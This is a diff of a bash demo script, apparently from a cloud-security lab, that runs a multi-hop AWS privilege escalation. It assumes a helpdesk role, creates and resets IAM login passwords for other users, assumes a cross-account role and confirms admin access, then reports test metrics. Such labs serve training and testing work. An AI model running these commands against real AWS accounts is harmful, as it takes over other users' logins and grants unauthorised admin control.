@@ -3,7 +3,9 @@
 # Demo script for x-account-from-dev-to-prod-multi-hop-privesc-both-sides module
 # This script demonstrates multi-hop privilege escalation across accounts using login profiles
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +13,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 echo -e "${BLUE}=== Multi-Hop Cross-Account Privilege Escalation Attack Demo ===${NC}"
 echo "This demo shows how a dev user can escalate to admin privileges"
@@ -30,6 +50,7 @@ if ! aws sts get-caller-identity &> /dev/null; then
 fi
 
 echo -e "${YELLOW}Step 1: Verifying current identity${NC}"
+show_cmd aws sts get-caller-identity --output json
 CURRENT_IDENTITY=$(aws sts get-caller-identity --output json)
 echo "Current identity:"
 echo "$CURRENT_IDENTITY" | jq '.'
@@ -53,106 +74,119 @@ echo "Attempting to assume the pl-helpdesk role in dev account..."
 HELPDESK_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-helpdesk"
 echo "Attempting to assume role: $HELPDESK_ROLE_ARN"
 
+show_attack_cmd aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json
 if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json 2>&1); then
     echo -e "${GREEN}✓ Successfully assumed helpdesk role!${NC}"
     echo ""
-    
+
     # Extract the credentials
     ACCESS_KEY_ID=$(echo "$HELPDESK_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
     SECRET_ACCESS_KEY=$(echo "$HELPDESK_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
     SESSION_TOKEN=$(echo "$HELPDESK_CREDENTIALS" | jq -r '.Credentials.SessionToken')
-    
+
     # Set the credentials for the assumed role
     export AWS_ACCESS_KEY_ID="$ACCESS_KEY_ID"
     export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
     export AWS_SESSION_TOKEN="$SESSION_TOKEN"
-    
+
     echo -e "${YELLOW}Step 3: Creating login profile for Josh user${NC}"
     echo "Using helpdesk role to create a login profile for pl-Josh user..."
-    
+
     # Create a login profile for Josh user
+    show_attack_cmd aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required
     if aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully created login profile for pl-Josh!${NC}"
         echo ""
-        
+
         echo -e "${YELLOW}Step 4: Switching to Josh user credentials${NC}"
         echo "Now we need to use Josh's credentials to continue the attack..."
         echo "Note: In a real attack, the attacker would need to obtain Josh's credentials"
         echo "through other means (phishing, credential theft, etc.)"
         echo ""
-        
+
         # For demo purposes, we'll simulate having Josh's credentials
         # In reality, the attacker would need to obtain these through other means
         echo "Simulating access to Josh's credentials..."
         echo "Josh user now has admin access in dev account"
         echo ""
-        
+
         # Unset the helpdesk credentials
         unset AWS_ACCESS_KEY_ID
         unset AWS_SECRET_ACCESS_KEY
         unset AWS_SESSION_TOKEN
-        
+
         echo -e "${YELLOW}Step 5: Josh assumes trustsdev role in prod${NC}"
         echo "Josh (admin in dev) now assumes the pl-trustsdev role in prod..."
-        
+
         # Get prod account ID (assuming it's different from dev)
         # In a real scenario, this would be known or discovered
         PROD_ACCOUNT_ID="${DEV_ACCOUNT_ID}"  # For demo, using same account
         TRUSTSDEV_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-trustsdev"
-        
+
         echo "Attempting to assume role: $TRUSTSDEV_ROLE_ARN"
-        
+
+        show_attack_cmd aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json
         if TRUSTSDEV_CREDENTIALS=$(aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json 2>&1); then
             echo -e "${GREEN}✓ Successfully assumed trustsdev role in prod!${NC}"
             echo ""
-            
+
             # Extract the credentials
             ACCESS_KEY_ID=$(echo "$TRUSTSDEV_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
             SECRET_ACCESS_KEY=$(echo "$TRUSTSDEV_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
             SESSION_TOKEN=$(echo "$TRUSTSDEV_CREDENTIALS" | jq -r '.Credentials.SessionToken')
-            
+
             # Set the credentials for the assumed role
             export AWS_ACCESS_KEY_ID="$ACCESS_KEY_ID"
             export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
             export AWS_SESSION_TOKEN="$SESSION_TOKEN"
-            
+
             echo -e "${YELLOW}Step 6: Updating Jeremy's login profile in prod${NC}"
             echo "Using trustsdev role to update pl-Jeremy's login profile..."
-            
+
             # Update Jeremy's login profile
+            show_attack_cmd aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required
             if aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required 2>/dev/null; then
                 echo -e "${GREEN}✓ Successfully updated login profile for pl-Jeremy!${NC}"
                 echo ""
-                
+
                 echo -e "${YELLOW}Step 7: Verifying Jeremy's admin access${NC}"
                 echo "Jeremy now has admin access in prod account..."
-                
+
                 # Verify Jeremy's access by checking his user info
                 if JEREMY_INFO=$(aws iam get-user --user-name "pl-Jeremy" 2>/dev/null); then
                     echo -e "${GREEN}✓ Successfully verified Jeremy's admin access!${NC}"
                     echo "Jeremy user info:"
                     echo "$JEREMY_INFO" | jq '.'
                     echo ""
-                    
+
                     # Test admin permissions
                     echo "Testing admin permissions..."
+                    show_cmd aws iam list-users --output json
                     if aws iam list-users --output json > /dev/null 2>&1; then
                         echo -e "${GREEN}✓ Can list IAM users (admin permission confirmed)${NC}"
                     fi
-                    
+
+                    show_cmd aws s3 ls
                     if aws s3 ls > /dev/null 2>&1; then
                         echo -e "${GREEN}✓ Can list S3 buckets (admin permission confirmed)${NC}"
                     fi
-                    
+
                 else
                     echo -e "${YELLOW}⚠ Could not verify Jeremy's access directly${NC}"
                 fi
-                
+
                 # Unset the credentials
                 unset AWS_ACCESS_KEY_ID
                 unset AWS_SECRET_ACCESS_KEY
                 unset AWS_SESSION_TOKEN
-                
+
+                if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+                    echo -e "\n${YELLOW}Attack Commands:${NC}"
+                    for cmd in "${ATTACK_COMMANDS[@]}"; do
+                        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+                    done
+                fi
+
                 echo ""
                 echo -e "${GREEN}=== ATTACK SUCCESSFUL ===${NC}"
                 echo "The attack successfully demonstrated multi-hop privilege escalation:"
@@ -161,12 +195,12 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
                 echo "3. Trustsdev role updated Jeremy's login profile in prod"
                 echo "4. Jeremy now has admin access in prod account"
                 echo ""
-                
+
                 # Output standardized test results
                 echo "TEST_RESULT:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:SUCCESS"
                 echo "TEST_DETAILS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:Successfully demonstrated multi-hop cross-account privilege escalation using login profiles"
                 echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumed=true,josh_profile_created=true,trustsdev_assumed=true,jeremy_profile_updated=true,admin_access_confirmed=true"
-                
+
             else
                 echo -e "${RED}✗ Failed to update Jeremy's login profile${NC}"
                 echo "This could be because:"
@@ -179,7 +213,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
                 echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumed=true,josh_profile_created=true,trustsdev_assumed=true,jeremy_profile_update_failed=true"
                 exit 1
             fi
-            
+
         else
             echo -e "${RED}✗ Failed to assume trustsdev role in prod${NC}"
             echo "Error: $TRUSTSDEV_CREDENTIALS"
@@ -194,7 +228,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
             echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumed=true,josh_profile_created=true,trustsdev_assumption_failed=true"
             exit 1
         fi
-        
+
     else
         echo -e "${RED}✗ Failed to create login profile for Josh${NC}"
         echo "This could be because:"
@@ -207,7 +241,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
         echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumed=true,josh_profile_creation_failed=true"
         exit 1
     fi
-    
+
 else
     echo -e "${RED}✗ Failed to assume helpdesk role${NC}"
     echo "Error: $HELPDESK_CREDENTIALS"
@@ -222,3 +256,6 @@ else
     echo "TEST_METRICS:x-account-from-dev-to-prod-multi-hop-privesc-both-sides:helpdesk_assumption_failed=true"
     exit 1
 fi
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
